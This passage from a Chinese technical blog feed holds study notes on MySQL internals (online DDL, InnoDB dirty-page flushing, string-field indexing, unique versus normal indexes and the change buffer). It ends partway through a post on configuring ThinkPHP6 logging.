版本之前，这个命令的执行流程跟我们前面描述的差不多，区别只是这个临时表 B 不需要你自己创建，MySQL 会自动完成转存数据、交换表名、删除旧表的操作。</p><p>不过需要注意的是，在整个 DDL 过程中，表 A 中不能有更新。也就是说，这个 DDL 不是 Online 的。</p><h2 id="Online-和-Inplace"><a href="#Online-和-Inplace" class="headerlink" title="Online 和 Inplace"></a>Online 和 Inplace</h2><p>另一个跟 Online 有关， 比较容易混淆的概念是 Inplace。</p><p>在上面的重建表的过程中，重建出来的数据会放在“tmp_file” 临时文件中，这个临时文件是 InnoDB 在内部创建出来的。整个 DDL 过程都在 InnoDB 内部完成。</p><p>对于 server 层来说，<strong>没有把数据挪动到临时表，是一个“原地”操作，这就是“Inplace”名称的来源</strong>。</p><p>所以，我现在问你，如果你有一个 1TB 的表，现在磁盘间是 1.2TB，能不能做一个 Inplace 的 DDL 呢？</p><p>答案是不能。因为，tmp_file 也是要占用临时空间的。</p><p>Online 和 Inplace 这两个逻辑之间的关系是什么？</p><ul><li>DDL 过程如果是 Online 的，就一定是 inplace 的</li><li>反过来未必，也就是说 inplace 的 DDL，有可能不是 Online 的。截止到 MySQL 8.0，添加全文索引（FULLTEXT index）和空间索引 (SPATIAL index) 就属于这种情况</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>只是 delete 掉表里面不用的数据的话，表文件的大小是不会变的</li><li>drop table 命令可以回收表空间，但是会把表结构定义和数据全部删掉</li><li>如果希望在保留表结构以及数据的情况下，还能回收表空间，那么可以考虑重建表</li><li>使用 alter table 重建表，有两种方式：<ul><li><code>alter table t engine=innodb,ALGORITHM=copy;</code>：这个 DDL 不是 Online 的</li><li><code>alter table t engine=innodb,ALGORITHM=inplace;</code>：这个 DDL 是 Online 的</li></ul></li><li>Mysql 5.6 之后，除了增加加全文索引不是 online，其他 alter 操作(增删字段、增删索引等)都是支持 online ddl </li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>12 为什么我的 Mysql 会抖一下</title>
      <link href="/why-does-my-mysql-shake/"/>
      <url>/why-does-my-mysql-shake/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ol><li>了解脏页与干净页的概念</li><li>了解InnoDB 刷脏页的控制策略</li></ol><a id="more"></a><h2 id="你的-SQL-语句为什么变“慢”了"><a href="#你的-SQL-语句为什么变“慢”了" class="headerlink" title="你的 SQL 语句为什么变“慢”了"></a>你的 SQL 语句为什么变“慢”了</h2><p>当内存数据页跟磁盘数据页内容不一致的时候，我们称这个内存页为“脏页”。内存数据写入到磁盘后，内存和磁盘上的数据页的内容就一致了，称为“干净页”。</p><p>不论是脏页还是干净页，都在内存中。</p><p>接下来，我们用一个示意图来展示一下“孔乙己赊账”的整个操作过程。假设原来孔乙己欠账 10 文，这次又要赊 9 文。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220622234633.png" alt=""><br>回到文章开头的问题，你不难想象，平时执行很快的更新操作，其实就是在写内存和日志，而 MySQL 偶尔“抖”一下的那个瞬间，可能就是在刷脏页（flush）。</p><p>那么，什么情况会引发数据库的 flush 过程呢？</p><p>我们还是继续用咸亨酒店掌柜的这个例子，想一想：掌柜在什么情况下会把粉板上的赊账记录改到账本上？</p><ul><li>第一种场景是，粉板满了，记不下了。这时候如果再有人来赊账，掌柜就只得放下手里的活儿，将粉板上的记录擦掉一些，留出空位以便继续记账。当然在擦掉之前，他必须先将正确的账目记录到账本中才行。</li></ul><p>这个场景，对应的就是 InnoDB 的 redo log 写满了。这时候系统会停止所有更新操作，把 checkpoint 往前推进，redo log 留出空间可以继续写。我在第二讲画了一个 redo log 的示意图，这里我改成环形，便于大家理解。</p><ul><li>第二种场景是，这一天生意太好，要记住的事情太多，掌柜发现自己快记不住了，赶紧找出账本把孔乙己这笔账先加进去。</li></ul><p>这种场景，对应的就是系统内存不足。当需要新的内存页，而内存不够用的时候，就要淘汰一些数据页，空出内存给别的数据页使用。如果淘汰的是“脏页”，就要先将脏页写到磁盘。</p><p>这个时候能否直接把内存淘汰掉，下次需要请求的时候，从磁盘读入数据页，然后拿 redo log 出来应用？</p><p>这里其实是从性能考虑的。如果刷脏页一定会写盘，就保证了每个数据页有两种状态：</p><ul><li><p>一种是内存里存在，内存里就肯定是正确的结果，直接返回；</p></li><li><p>另一种是内存里没有数据，就可以肯定数据文件上是正确的结果，读入内存后返回。这样的效率最高。</p></li><li><p>第三种场景是，生意不忙的时候，或者打烊之后。这时候柜台没事，掌柜闲着也是闲着，不如更新账本。</p></li></ul><p>这种场景，对应的就是 MySQL 认为系统“空闲”的时候。当然，MySQL“这家酒店”的生意好起来可是会很快就<br>能把粉板记满的，所以“掌柜”要合理地安排时间，即使是“生意好”的时候，也要见缝插针地找时间，只要有机会就刷一点“脏页”。</p><ul><li>第四种场景是，年底了咸亨酒店要关门几天，需要把账结清一下。这时候掌柜要把所有账都记到账本上，这样过完年重新开张的时候，就能就着账本明确账目情况了。</li></ul><p>这种场景，对应的就是 MySQL 正常关闭的情况。这时候，MySQL 会把内存的脏页都 flush 到磁盘上，这样下次 MySQL 启动的时候，就可以直接从磁盘上读数据，启动速度会很快。</p><p><strong>四种场景对应性能分析</strong></p><p>其中，第三种情况是属于 MySQL 空闲时的操作，这时系统没什么压力，而第四种场景是数据库本来就要关闭了。这两种情况下，你不会太关注“性能”问题。所以这里，我们主要来分析一下前两种场景下的性能问题。</p><p>第一种是“redo log 写满了，要 flush 脏页”，这种情况是 InnoDB 要尽量避免的。因为出现这种情况的时候，整个系统就不能再接受更新了，所有的更新都必须堵住。如果你从监控上看，这时候更新数会跌为 0。</p><p>第二种是“内存不够用了，要先将脏页写到磁盘”，这种情况其实是常态。InnoDB 用缓冲池（buffer pool）管理内存，缓冲池中的内存页有三种状态：</p><p>第一种是，还没有使用的；<br>第二种是，使用了并且是干净页；<br>第三种是，使用了并且是脏页。<br>InnoDB 的策略是尽量使用内存，因此对于一个长时间运行的库来说，未被使用的页面很少。</p><p>而当要读入的数据页没有在内存的时候，就必须到缓冲池中申请一个数据页。这时候只能把最久不使用的数据页从内存中淘汰掉：如果要淘汰的是一个干净页，就直接释放出来复用；但如果是脏页呢，就必须将脏页先刷到磁盘，变成干净页后才能复用。</p><p>所以，刷脏页虽然是常态，但是出现以下这两种情况，都是会明显影响性能的：</p><ol><li>一个查询要淘汰的脏页个数太多，会导致查询的响应时间明显变长；</li><li>日志写满，更新全部堵住，写性能跌为 0，这种情况对敏感业务来说，是不能接受的。</li></ol><p>所以，InnoDB 需要有控制脏页比例的机制，来尽量避免上面的这两种情况。</p><h2 id="InnoDB-刷脏页的控制策略"><a href="#InnoDB-刷脏页的控制策略" class="headerlink" title="InnoDB 刷脏页的控制策略"></a>InnoDB 刷脏页的控制策略</h2><ul><li><code>innodb_io_capacity</code> 这个参数可以设置磁盘的 I/O 能力，不能设置太小，会导致刷脏页的速度变慢。</li><li><code>innodb_max_dirty_pages_pct</code> 用来设置脏页比例上限，默认值是 75%。</li></ul><p>InnoDB 会在后台刷脏页，而刷脏页的过程是要将内存页写入磁盘。所以，无论是你的查询语句在需要内存的时候可能要求淘汰一个脏页，还是由于刷脏页的逻辑会占用 IO 资源并可能影响到了你的更新语句，都可能是造成你从业务端感知到 MySQL“抖”了一下的原因。</p><p>要尽量避免这种情况，你就要合理地设置 <code>innodb_io_capacity</code> 的值，并且平时要多关注脏页比例，不要让它经常接近 75%。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>当内存数据页跟磁盘数据页内容不一致的时候，我们称这个内存页为“脏页”。内存数据写入到磁盘后，内存和磁盘上的数据页的内容就一致了，称为“干净页”。</li><li>把内存里的数据写入磁盘的过程，叫做 flush</li><li>平时感知到 MySQL“抖”了一下，可能就是因为刚刚在刷脏页（flush）</li><li>可以通过一些参数设置磁盘 I/O 能力，提高刷脏页的速度</li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11 怎么给字符串字段加索引</title>
      <link href="/how-to-add-an-index-to-a-string-field/"/>
      <url>/how-to-add-an-index-to-a-string-field/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ol><li>搞清楚怎么给字符串字段加索引</li><li>了解前缀索引对覆盖索引的影响</li></ol><a id="more"></a><h2 id="前缀索引与全字段索引"><a href="#前缀索引与全字段索引" class="headerlink" title="前缀索引与全字段索引"></a>前缀索引与全字段索引</h2><p>MySQL 是支持前缀索引的，也就是说，可以定义字符串的一部分作为索引。默认地，如果你创建索引的语句不指定前缀长度，那么索引就会包含整个字符串。</p><p>对于前缀索引和全字段索引来说，这两种不同的定义在数据结构和存储上有什么区别呢？</p><p>全字段索引：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220620231501.png" alt=""></p><p>前缀索引：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220620231514.png" alt=""><br>从上图中可以看到，前缀索引结构中每个邮箱字段都只取前 6 个字节（即：zhangs），所以占用的空间会更小，这就是使用前缀索引的优势。</p><p>但，这同时带来的损失是，可能会增加额外的记录扫描次数。</p><p>接下来从微观的角度来看一下，在这两个不同的索引下，执行过程分别是怎样的。</p><p><strong>如果使用的是 index1（即 email 整个字符串的索引结构）</strong>，执行顺序是这样的：</p><ol><li>从 index1 索引树找到满足索引值是’<a href="mailto:zhangssxyz@xxx.com">zhangssxyz@xxx.com</a>’的这条记录，取得 ID2 的值；</li><li>到主键上查到主键值是 ID2 的行，判断 email 的值是正确的，将这行记录加入结果集；</li><li>取 index1 索引树上刚刚查到的位置的下一条记录，发现已经不满足 email=’zhangssxyz@xxx.com’的条件了，循环结束。</li></ol><p>这个过程中，只需要回主键索引取一次数据，所以系统认为只扫描了一行。</p><p><strong>如果使用的是 index2（即 email(6) 索引结构）</strong>，执行顺序是这样的：</p><ol><li>从 index2 索引树找到满足索引值是’zhangs’的记录，找到的第一个是 ID1；</li><li>到主键上查到主键值是 ID1 的行，判断出 email 的值不是’<a href="mailto:zhangssxyz@xxx.com">zhangssxyz@xxx.com</a>’，这行记录丢弃；</li><li>取 index2 上刚刚查到的位置的下一条记录，发现仍然是’zhangs’，取出 ID2，再到 ID 索引上取整行然后判断，这次值对了，将这行记录加入结果集；</li><li>重复上一步，直到在 idxe2 上取到的值不是’zhangs’时，循环结束</li></ol><p>在这个过程中，要回主键索引取 4 次数据，也就是扫描了 4 行。</p><p>也就是说使用前缀索引，定义好长度，<strong>就可以做到既节省空间，又不用额外增加太多的查询成本。</strong></p><h2 id="前缀索引对覆盖索引的影响"><a href="#前缀索引对覆盖索引的影响" class="headerlink" title="前缀索引对覆盖索引的影响"></a>前缀索引对覆盖索引的影响</h2><p>先来看看这个 SQL 语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,email from SUser where email&#x3D;&#39;zhangssxyz@xxx.com&#39;;</span><br></pre></td></tr></table></figure><p>与前面例子中的 SQL 语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,name,email from SUser where email&#x3D;&#39;zhangssxyz@xxx.com&#39;;</span><br></pre></td></tr></table></figure><p>相比，这个语句只要求返回 id 和 email 字段。</p><p>所以，如果使用 index1（即 email 整个字符串的索引结构）的话，可以利用覆盖索引，从 index1 查到结果后直接就返回了，不需要回到 ID 索引再去查一次。而如果使用 index2（即 email(6) 索引结构）的话，就不得不回到 ID 索引再去判断 email 字段的值。</p><p>即使你将 index2 的定义修改为 email(18) 的前缀索引，这时候虽然 index2 已经包含了所有的信息，但 InnoDB 还是要回到 id 索引再查一下，因为系统并不确定前缀索引的定义是否截断了完整信息。</p><p>也就是说，使用前缀索引就用不上覆盖索引对查询性能的优化了，这也是你在选择是否使用前缀索引时需要考虑的一个因素。</p><h2 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h2><p>第一种方式是使用倒序存储。</p><p>有时候有些业务场景的前缀是一样的，这个时候如果继续使用前缀索引，其实没有太大意义。</p><p>这个时候可以考虑使用<strong>倒序存储</strong>。</p><hr><p>第二种方式是使用 hash 字段。</p><p>可以在表上再创建一个整数字段，来保存字段的校验码，同时在这个字段上创建索引。</p><p>然后每次插入新记录的时候，都同时用 <code>crc32()</code> 这个函数得到校验码填到这个新字段。</p><p>由于校验码可能存在冲突，也就是说两个不同的值通过 <code>crc32()</code> 函数得到的结果可能是相同的，所以你的查询语句 where 部分要判断字段的值是否精确相同。</p><p>这样，索引的长度变成了 4 个字节，比原来小了很多。</p><p>使用倒序存储和使用 hash 字段这两种方法的异同点。</p><ul><li>相同点：都不支持范围查询。倒序存储的字段上创建的索引是按照倒序字符串的方式排序的，已经没有办法利用索引方式查出身份证号码在 [ID_X, ID_Y] 的所有市民了。同样地，hash 字段的方式也只能支持等值查询。</li><li>异同点：<ul><li>从占用的额外空间来看，倒序存储方式在主键索引上，不会消耗额外的存储空间，而 hash 字段方法需要增加一个字段。当然，倒序存储方式使用 4 个字节的前缀长度应该是不够的，如果再长一点，这个消耗跟额外这个 hash 字段也差不多抵消了。</li><li>在 CPU 消耗方面，倒序方式每次写和读的时候，都需要额外调用一次 reverse 函数，而 hash 字段的方式需要额外调用一次 crc32() 函数。如果只从这两个函数的计算复杂度来看的话，reverse 函数额外消耗的 CPU 资源会更小些。</li><li>从查询效率上看，使用 hash 字段方式的查询性能相对更稳定一些。因为 crc32 算出来的值虽然有冲突的概率，但是概率非常小，可以认为每次查询的平均扫描行数接近 1。而倒序存储方式毕竟还是用的前缀索引的方式，也就是说还是会增加扫描行数。</li></ul></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果想给一个字符串创建一个索引，有四种方案：</p><ol><li>直接创建完整索引，这样可能比较占用空间；</li><li>创建前缀索引，节省空间，但会增加查询扫描次数，并且不能使用覆盖索引；</li><li>倒序存储，再创建前缀索引，用于绕过字符串本身前缀的区分度不够的问题；</li><li>创建 hash 字段索引，查询性能稳定，有额外的存储和计算消耗，跟第三种方式一样，都不支持范围扫描;</li></ol>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>09 普通索引和唯一索引，应该怎么选择</title>
      <link href="/how-to-choose-common-index-and-unique-index/"/>
      <url>/how-to-choose-common-index-and-unique-index/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记。</p><p>课程重点：</p><ol><li>对于不同业务场景下，应该选择普通索引，还是唯一索引</li><li>理解 change buffer 的机制</li></ol><a id="more"></a><p>假如现在需要维护一个市民系统，每个人都有一个唯一的身份证号，而且业务代码已经保证了不会写入两个重复的身份证号。如果市民系统需要按照身份证号查姓名，就会执行类似这样的 SQL 语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from CUser where id_card &#x3D; &#39;xxxxxxxyyyyyyzzzzz&#39;;</span><br></pre></td></tr></table></figure><p>由于身份证号字段比较大，不建议把身份证号当做主键，那么现在有两个选择，要么给 id_card 字段创建唯一索引，要么创建一个普通索引。如果业务代码已经保证了不会写入重复的身份证号，那么这两个选择逻辑上都是正确的。</p><p>现在的问题就是，从性能的角度考虑，选择唯一索引还是普通索引呢？选择的依据是什么呢？</p><p>InnoDB 的索引组织结构：</p><p><img src="https://learn.lianglianglee.com/%E4%B8%93%E6%A0%8F/MySQL%E5%AE%9E%E6%88%9845%E8%AE%B2/assets/1ed9536031d6698570ea175a7b7f9a46.png" alt=""></p><h2 id="查询过程"><a href="#查询过程" class="headerlink" title="查询过程"></a>查询过程</h2><p><code>select id from T where k=5</code> 这个查询语句在索引树上查找的过程，先是通过 B+ 树从树根开始，按层搜索到叶子节点，也就是图中右下角的这个数据页，然后可以认为数据页内部通过二分法来定位记录。</p><ul><li>对于普通索引来说，查找到满足条件的第一个记录 (5,500) 后，需要查找下一个记录，直到碰到第一个不满足 k=5 条件的记录。</li><li>对于唯一索引来说，由于索引定义了唯一性，查找到第一个满足条件的记录后，就会停止继续检索。</li></ul><p>查询过程的性能消耗，两者的差距几乎微乎其微。</p><p>InnoDB 的数据是按数据页为单位来读写的。也就是说，当需要读一条记录的时候，并不是将这个记录本身从磁盘读出来，而是以页为单位，将其整体读入内存。在 InnoDB 中，每个数据页的大小默认是 16KB。</p><p>因为引擎是按页读写的，所以说，当找到 k=5 的记录的时候，它所在的数据页就都在内存里了。那么，对于普通索引来说，要多做的那一次“查找和判断下一条记录”的操作，就只需要一次指针寻找和一次计算。</p><p>当然，如果 k=5 这个记录刚好是这个数据页的最后一个记录，那么要取下一个记录，必须读取下一个数据页，这个操作会稍微复杂一些。</p><p>但是，我们之前计算过，对于整型字段，一个数据页可以放近千个 key，因此出现这种情况的概率会很低。所以，我们计算平均性能差异时，仍可以认为这个操作成本对于现在的 CPU 来说可以忽略不计。</p><h2 id="更新过程"><a href="#更新过程" class="headerlink" title="更新过程"></a>更新过程</h2><p>为了说明普通索引和唯一索引对更新语句性能的影响这个问题，需要先介绍一下 change buffer。</p><p>当需要更新一个数据页时，如果数据页在内存中就直接更新，而如果这个数据页还没有在内存中的话，在不影响数据一致性的前提下，InooDB 会将这些更新操作缓存在 change buffer 中，这样就不需要从磁盘中读入这个数据页了。在下次查询需要访问这个数据页的时候，将数据页读入内存，然后执行 change buffer 中与这个页有关的操作。通过这种方式就能保证这个数据逻辑的正确性。</p><p>需要说明的是，虽然名字叫作 change buffer，实际上它是可以持久化的数据。也就是说，change buffer 在内存中有拷贝，也会被写入到磁盘上。</p><p><strong>将 change buffer 中的操作应用到原数据页，得到最新结果的过程称为 merge</strong>。除了访问这个数据页会触发 merge 外，系统有后台线程会定期 merge。在数据库正常关闭（shutdown）的过程中，也会执行 merge 操作。</p><p>显然，<strong>如果能够将更新操作先记录在 change buffer，减少读磁盘，语句的执行速度会得到明显的提升。而且，数据读入内存是需要占用 buffer pool 的，所以这种方式还能够避免占用内存，提高内存利用率</strong>。</p><blockquote><p>所以，什么条件下可以使用 change buffer 呢？</p></blockquote><p>对于唯一索引来说，所有的更新操作都要先判断这个操作是否违反唯一性约束。比如，要插 入 (4,400) 这个记录，就要先判断现在表中是否已经存在 k=4 的记录，而这必须要将数据 页读入内存才能判断。如果都已经读入到内存了，那直接更新内存会更快，就没必要使用 change buffer 了。</p><p>因此，<strong>唯一索引的更新就不能使用 change buffer，实际上也只有普通索引可以使用</strong>。</p><p>在理解了 change buffer 机制之后，再来看看如果要在这张表中插 入一个新记录 (4,400) 的话，InnoDB 的处理流程是怎样的。</p><p>如果这个记录要更新的目标页在内存中。这时，InnoDB 的处理流程如下：</p><ul><li>对于唯一索引来说，找到 3 和 5 之间的位置，判断到没有冲突，插入这个值，语句执行结束;</li><li>对于普通索引来说，找到 3 和 5 之间的位置，插入这个值，语句执行结束。</li></ul><p>这样看来，普通索引和唯一索引对更新语句性能影响的差别，只是一个判断，只会耗费微小 的 CPU 时间。<br>但，这不是我们关注的重点。</p><p>如果这个记录要更新的目标页不在内存中。这时，InnoDB 的处理流程如下：</p><ul><li>对于唯一索引来说，需要将数据页读入内存，判断到没有冲突，插入这个值，语句执行结束;</li><li>对于普通索引来说，则是将更新记录在 change buffer，语句执行就结束了。</li></ul><p>将数据从磁盘读入内存涉及随机 IO 的访问，是数据库里面成本最高的操作之一。change buffer 因为减少了随机磁盘访问，所以对更新性能的提升是会很明显的。</p><h2 id="change-buffer-的使用场景"><a href="#change-buffer-的使用场景" class="headerlink" title="change buffer 的使用场景"></a>change buffer 的使用场景</h2><p>通过上面的分析已经清楚了，使用 change buffer 对更新过程有加速作用，change buffer 仅限于普通索引使用，不适用唯一索引。</p><blockquote><p>那么，普通索引的所有场景，使用 change buffer 都可以起到加速作用吗?</p></blockquote><p><strong>因为 merge 的时候是真正进行数据更新的时刻</strong>，而 change buffer 的主要目的就是将记录 的变更动作缓存下来，所以在一个数据页做 merge 之前，change buffer 记录的变更越多 (也就是这个页面上要更新的次数越多)，收益就越大。</p><p>因此，对于写多读少的业务来说，页面在写完以后马上被访问到的概率比较小，此时 change buffer 的使用效果最好。这种业务模型常见的就是账单类、日志类的系统。</p><p>反过来，假设一个业务的更新模式是写入之后马上会做查询，那么即使满足了条件，将更新 先记录在 change buffer，但之后由于马上要访问这个数据页，会立即触发 merge 过程。 这样随机访问 IO 的次数不会减少，反而增加了 change buffer 的维护代价。所以，对于这 种业务模式来说，change buffer 反而起到了副作用。</p><h2 id="索引选择和实践"><a href="#索引选择和实践" class="headerlink" title="索引选择和实践"></a>索引选择和实践</h2><p>回到开头的问题，普通索引和唯一索引应该怎么选择？</p><p>其实，这两类索引在查询能力上是没差别的，主要考虑的是对更新性能的影响。因此如果业务可以接受，从性能角度出发建议优先考虑非唯一索引。</p><p>如果所有的更新后面，都马上伴随着对这个记录的查询，那么你应该关闭 change buffer。 而在其他情况下，change buffer 都能提升更新性能。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>change buffer 的机制：当需要更新一个数据页时，如果数据页在内存中就直接更新，而如果这个数据页还没有在内存中的话，在不影响数据一致性的前提下，InooDB 会将这些更新操作缓存在 change buffer 中，这样就不需要从磁盘中读入这个数据页了。</li><li>change buffer 的优势：不需要从磁盘中读入这个数据页，减少 I/O 访问次数</li><li>哪些操作会触发 merge：访问数据页、系统有后台线程会定期 merge、在数据库正常关闭 (shutdown)的过程中，也会执行 merge 操作</li><li>普通索引可以使用change buffer，唯一索引不用使用 change buffer </li><li>redo log 主要节省的 是随机写磁盘的 IO 消耗(转成顺序写)，而 change buffer 主要节省的则是随机读磁盘 的 IO 消耗。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP6 自定义日志驱动</title>
      <link href="/thinkphp6-custom-log-driver/"/>
      <url>/thinkphp6-custom-log-driver/</url>
      
        <content type="html"><![CDATA[<p>最近接手一个项目，<code>ThinkPHP6.x</code> 写的，日志处理形同虚设，每次出了啥问题，第一时间也不知道问题出在哪，调试起来障碍很多。</p><a id="more"></a><p>ThinkPHP 6.0 在日志这一块，改动挺大了，直接砍掉了原来的请求信息部分。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220619091135.png" alt=""></p><h2 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h2><p>ThinkPHP 对系统的日志按照级别来分类记录，按照 <code>PSR-3</code> 日志规范。除非是实时写入的日志，其它日志都是在当前请求结束的时候统一写入的 所以不要在日志写入之后使用exit等中断操作会导致日志写入失败。</p><p>日志的级别从低到高依次为：<code>debug</code>，<code>info</code>，<code>notice</code>，<code>warning</code>，<code>error</code>，<code>critical</code>，<code>alert</code>， <code>emergency</code>，ThinkPHP 额外增加了一个 <code>sql</code> 日志级别仅用于记录SQL日志（并且仅当开启数据库调试模式有效）。</p><h2 id="设置日志记录级别"><a href="#设置日志记录级别" class="headerlink" title="设置日志记录级别"></a>设置日志记录级别</h2><p><code>config/log.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">handle</span>\<span class="title">Tp6Log</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 日志记录级别</span></span><br><span class="line">    <span class="string">'level'</span>        =&gt; [],</span><br><span class="line">];</span><br></pre></td></tr></table></figure><ul><li>当 level 为空时，记录所有级别</li><li>当 level 不为空时，只记录level中指定的错误级别</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 当 level 配置为 notice、warning</span></span><br><span class="line">    <span class="comment">// 会记录</span></span><br><span class="line">    Log::warning(<span class="string">"这是第一段日志"</span>);  </span><br><span class="line">    <span class="comment">// 不会记录，因为 info 不在日志级别中</span></span><br><span class="line">    Log::info(<span class="string">"这是第二段日志"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="单一日志"><a href="#单一日志" class="headerlink" title="单一日志"></a>单一日志</h2><p>默认的 ThinkPHP 日志是写在当前日期(年月)目录下的，如(runtime/admin/log/202204/30.log)</p><p>设置单文件日志写入之后，所有日志则写入 <code>single.log</code> 文件中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">handle</span>\<span class="title">Tp6Log</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 单文件日志写入</span></span><br><span class="line">    <span class="string">'single'</span> =&gt; <span class="keyword">true</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><h2 id="独立日志"><a href="#独立日志" class="headerlink" title="独立日志"></a>独立日志</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">handle</span>\<span class="title">Tp6Log</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 独立日志级别</span></span><br><span class="line">    <span class="string">'apart_level'</span>    =&gt; [<span class="string">'error'</span>, <span class="string">'warning'</span>, <span class="string">"info"</span>],</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>设置独立日志级别之后，不同类型的日志将会分别记录到对应类型的日志文件下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 设置独立日志级别之前</span><br><span class="line">runtime&#x2F;admin&#x2F;log&#x2F;202204&#x2F;30.log</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置独立日志级别之后</span><br><span class="line">runtime&#x2F;admin&#x2F;log&#x2F;202204&#x2F;30_warning.log</span><br><span class="line">runtime&#x2F;admin&#x2F;log&#x2F;202204&#x2F;30_error.log</span><br><span class="line">runtime&#x2F;admin&#x2F;log&#x2F;202204&#x2F;30_info.log</span><br></pre></td></tr></table></figure><h2 id="日志的写入时机"><a href="#日志的写入时机" class="headerlink" title="日志的写入时机"></a>日志的写入时机</h2><p>日志写入时机提供两种</p><ul><li>实时写入</li><li>程序执行完后写入</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">handle</span>\<span class="title">Tp6Log</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 实时写入</span></span><br><span class="line">    <span class="string">'realtime_write'</span> =&gt; <span class="keyword">true</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h2 id="日志通道"><a href="#日志通道" class="headerlink" title="日志通道"></a>日志通道</h2><p><code>ThinkPHP6.x</code> 日志类的一大特性就是日志级别支持指定通道写入，也就是可以实现自定义的日志记录，自定义日志驱动类，实现 <code>think\contract\LogHandlerInterface</code> 接口。</p><p>将 <code>config/log.php</code> 中通道 type 改成自定义驱动类即可。</p><p><code>config.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 